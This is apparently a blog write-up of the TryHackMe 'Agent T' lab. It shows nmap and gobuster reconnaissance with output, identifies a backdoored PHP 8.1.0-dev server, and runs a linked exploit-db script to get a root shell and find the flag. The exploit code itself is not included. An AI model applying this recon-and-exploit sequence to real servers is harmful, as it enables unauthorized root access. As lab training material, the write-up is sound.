---
title: 'Tryhackme - Agent T Writeup'
description: 'Agent T uncovered this website, which looks innocent enough, but something seems off about how the server responds...' 
publishedAt: '2023-07-20'
---

# Tryhackme - Agent T (Easy) 
Agent T uncovered this website, which looks innocent enough, but something seems off about how the server responds...

After deploying the vulnerable machine attached to this task, please wait a couple of minutes for it to respond.

## Scanning the system
```bash
sudo nmap -sS -sV -p- -oN nmap.initial agentt.thm
```
Results:
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-20 13:51 CEST
Nmap scan report for agentt.thm (10.10.57.74)
Host is up (0.040s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.08 seconds
```

## Enumerating Webserver 
Based on the nmap report this doesn't seem to be a standard web server like Apache or Nginx, but a PHP webserver. I never heard of a PHP cli server myself, so i first googled what it is. Seems like its just a webserver that is built-in in php intended for testing while developing an application. It's not intended to be used on a public network.

### Manual enumeration
:article-img{src="/tryhackme-agent-t/dashboard.png"}
On the website there seems to be some sort of admin dashboard. By clicking on most links it's pretty clear that it's just template and not an actual functional website. Most links aren't working at all.

I checked if there was a sitemap or robots.txt present, but couldn't find one.
Looking through the code of the home page also didnt result in any clues.

### Bruteforcing directories
```bash
gobuster dir -u http://agentt.thm -w /opt/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://agentt.thm
[+] Threads:        10
[+] Wordlist:       /opt/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/07/20 14:00:32 Starting gobuster
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls. http://agentt.thm/4ff7bea7-7aa6-4fd9-94e4-e9d84de9c17f => 200. To force processing of Wildcard responses, specify the '--wildcard' switch
```
Bruteforcing directories won't work cause all of the non existing paths just lead back to the same home page.

Requests to files do seem to work and return a 404 like expected if they dont exist.

I started a scan for files with the php extension, but couldn't seem to find any other php files.
```bash
gobuster dir -u http://agentt.thm -w /opt/wordlists/dirbuster/directory-list-2.3-medium.txt -x php --wildcard | grep .php
```
```
gobuster dir -u http://agentt.thm -w /opt/wordlists/dirbuster/directory-list-2.3-medium.txt -x php --wildcard | grep .php
[+] Extensions:     php
/index.php (Status: 200)
/php (Status: 200)
/phpBB2 (Status: 200)
/logo_phpBB (Status: 200)
/grphp (Status: 200)
/phpbb (Status: 200)
/phpadsnew (Status: 200)
/phpads (Status: 200)
/phpAdsNew (Status: 200)
/phpBB (Status: 200)
```
The only results here apart from the index.php are directories.

### Diving deeper into the PHP Cli server 
By simply googling the name and version of the server I found out that there is a backdoor in this version of the CLI server.

An exploit for it is available on (exploit-db)[https://www.exploit-db.com/exploits/49933].
After running the exploit we get a shell as root.
```bash
python exploit.py
```
```
Enter the full host url:
http://agentt.thm/

Interactive shell is opened on http://agentt.thm/
Can't acces tty; job crontol turned off.
$ id
uid=0(root) gid=0(root) groups=0(root)
```

## Finding the flag
I couldn't find the flag in the `/root/` directory where it usually resides.
After checking a few more directories, i found the flag by simply running a find command.
```bash
find / -type f -name flag.txt 2>/dev/null
```
Turns out that the flag was simply in the root directory at `/flag.txt`.

## Conclusion
This box was very easy and after short enumeration of the webserver I found out there was a backdoor in this version of the PHP Cli webserver.
